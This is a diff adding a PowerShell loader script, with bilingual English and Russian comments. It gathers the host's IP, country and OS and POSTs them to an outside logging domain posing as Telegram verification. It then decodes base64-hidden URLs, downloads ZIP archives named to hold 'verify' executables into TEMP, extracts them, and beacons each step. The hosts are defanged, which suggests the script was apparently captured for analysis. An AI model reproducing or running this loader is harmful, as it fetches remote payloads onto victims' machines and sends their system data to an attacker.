@@ -1,0 +1,116 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+Write-Host "Script started" 
+# Скрипт запущен
+
+try {
+    # Collect system information 
+    # Сбор информации о системе
+    $ipInfo = Invoke-RestMethod -Uri "hxxp://ipinfo[.]io/json"
+    Write-Host "IP data received: $ipInfo" 
+    # IP-данные получены
+    $ip = $ipInfo.ip
+    $country = $ipInfo.country
+    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+    Write-Host "OS: $os, Country: $country" 
+    # ОС: $os, Страна: $country
+
+    # Form initial message data 
+    # Формирование данных для начального сообщения
+    $info = @{
+        ip = $ip
+        country = $country
+        flag = "🌍"
+        os = $os
+        message = ":rocket: Script execution started successfully.`nEarth IP: $ip`nLocation Country: $country`nSystem Operating system: $os`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    }
+
+    # Send initial message 
+    # Отправка начального сообщения
+    $infoJson = $info | ConvertTo-Json -Depth 10
+    Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"
+    Write-Host "Initial message sent." 
+    # Начальное сообщение отправлено.
+} catch {
+    Write-Host "Error collecting system information: $_" 
+    # Ошибка при сборе информации о системе
+}
+
+# List of resources with new domain micropedik.in 
+# Список ресурсов с новым доменом micropedik.in
+$e = @(
+    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzEuemlw"; z = "MS56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5MS5leGU=" }, 
+    # URL: hxxps://micropedik[.]in/1.zip, ZIP Name: 1.zip, Extract Type: extract, EXE: verify1.exe
+    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzIuemlw"; z = "Mi56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5Mi5leGU=" }, 
+    # URL: hxxps://micropedik[.]in/2.zip, ZIP Name: 2.zip, Extract Type: extract, EXE: verify2.exe
+    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzMuemlw"; z = "My56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5My5leGU=" }  
+    # URL: hxxps://micropedik[.]in/3.zip, ZIP Name: 3.zip, Extract Type: extract, EXE: verify3.exe
+)
+
+# Base64 decoding function 
+# Функция декодирования Base64
+function d([string]$s) {
+    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
+}
+
+# Download, extract, and execute loop 
+# Цикл скачивания, распаковки и запуска
+$i = 1
+foreach ($r in $e) {
+    try {
+        $u = d $r.u
+        $z = Join-Path $env:TEMP (d $r.z)
+        $extractFolder = "extract$i"  
+        # Generate a unique folder name 
+        # Формируем имя для каждой распаковки
+        $x = Join-Path $env:TEMP $extractFolder
+        $n = d $r.e
+
+        # Download ZIP file 
+        # Скачивание ZIP-файла
+        Write-Host "Downloading ZIP from $u" 
+        # Скачивание ZIP с $u
+        Invoke-WebRequest -Uri $u -OutFile $z
+
+        if (Test-Path $z) {
+            Write-Host "ZIP file downloaded: $z" 
+            # ZIP-файл скачан: $z
+            $statusMessage = ":package: ZIP file downloaded successfully: $z"
+        } else {
+            Write-Host "Error: ZIP file not downloaded." 
+            # Ошибка: ZIP-файл не скачан.
+            $statusMessage = ":x: ZIP file not downloaded: $u"
+            continue
+        }
+
+        # Send download status 
+        # Отправка статуса скачивания
+        $info.message = $statusMessage
+        $infoJson = $info | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"
+
+        # Create extraction folder 
+        # Создание папки для распаковки
+        if (-not (Test-Path $x)) { New-Item -ItemType Directory -Path $x | Out-Null }
+
+        # Extract ZIP 
+        # Распаковка ZIP
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($z, $x)
+        Write-Host "ZIP file extracted to $x" 
+        # ZIP-файл распакован в $x
+        $statusMessage = ":open_file_folder: ZIP file extracted to: $x"
+
+        # Send extraction status 
+        # Отправка статуса распаковки
+        $info.message = $statusMessage
+        $infoJson = $info | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"
+    } catch {
+        Write-Host "Execution error: $_" 
+        # Ошибка выполнения: $_
+    }
+    $i++  
+    # Increment counter for next extraction folder 
+    # Увеличиваем счётчик для следующей папки
+}
